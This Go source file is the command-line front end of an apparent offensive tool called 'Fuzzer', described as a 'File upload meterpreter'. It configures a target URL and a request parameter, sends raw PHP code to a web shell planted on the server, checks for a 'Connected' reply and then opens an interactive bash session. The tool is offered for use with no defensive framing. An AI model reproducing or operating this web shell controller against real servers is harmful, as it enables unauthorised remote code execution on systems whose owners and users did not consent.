package app

import (
	"fmt"
	"fuzzer"
	"fuzzer/src/bash"
	"fuzzer/src/common"
	"time"

	"github.com/urfave/cli"
)

type MainInterface struct {
	cmd *cli.App
}

func CreateMainApp() *MainInterface {
	main := MainInterface{}
	commands := _getCommands(&main)
	app := _createCli(&commands)

	main.cmd = app

	return &main
}

func _addInformation(app *cli.App) {
	app.Name = "Fuzzer"
	app.Version = "4.0.0"
	app.Compiled = time.Now()
	app.Authors = []cli.Author{
		cli.Author{
			Name:  "Kamikaze",
			Email: "leakleass@protomail.com",
		},
	}
	app.Copyright = "(c) 2016 Eat Bytes"
	app.Usage = "File upload meterpreter"
}

func _createCli(commands *[]cli.Command) *cli.App {
	client := cli.NewApp()
	client.Commands = *commands
	client.CommandNotFound = func(c *cli.Context, command string) {
		cli.ShowAppHelp(c)
	}

	_addInformation(client)

	return client
}

func (main *MainInterface) Run(command []string) {
	main.cmd.Run(command)
}

func (main *MainInterface) Help(c *cli.Context) {
	cli.ShowAppHelp(c)
}

func (main *MainInterface) Generate(c *cli.Context) {
	fmt.Println("generate")
}

func (main *MainInterface) StartBash(c *cli.Context) {
	bsh := bash.CreateBashApp()
	bsh.Start()
}

func (main *MainInterface) Start(c *cli.Context) {
	connect := main.ServerSetup(c)
	if !connect {
		return
	}

	main.StartBash(c)
}

func (main *MainInterface) ServerSetup(c *cli.Context) bool {
	srv := &fuzzer.NET

	url := c.String("u")
	method := c.Int("m")
	parameter := c.String("p")
	crypt := false

	if url == "" {
		fmt.Println("Flag -u (url) is required")
		return false
	}

	if method > 3 {
		fmt.Println("Method is between 0 (default) and 3. [0 => GET, 1 => POST, 2 => HEADER, 3 => COOKIE]")
		return false
	}

	if parameter == "" {
		parameter = srv.GetParameter()
	}

	srv.SetConfig(url, method, parameter, crypt)

	return main.SendTest(c)
}

func (main *MainInterface) SendTest(c *cli.Context) bool {
	t := fuzzer.PHP.Raw("$r=1;")
	result, err := common.Process(t)

	if err != nil {
		err.Error()
		return false
	}

	result = fuzzer.Decode(result)

	if result != "1" {
		fmt.Println("An error occured with the host")
		fmt.Println(result)

		return false
	}

	fmt.Println("Connected")
	return true
}
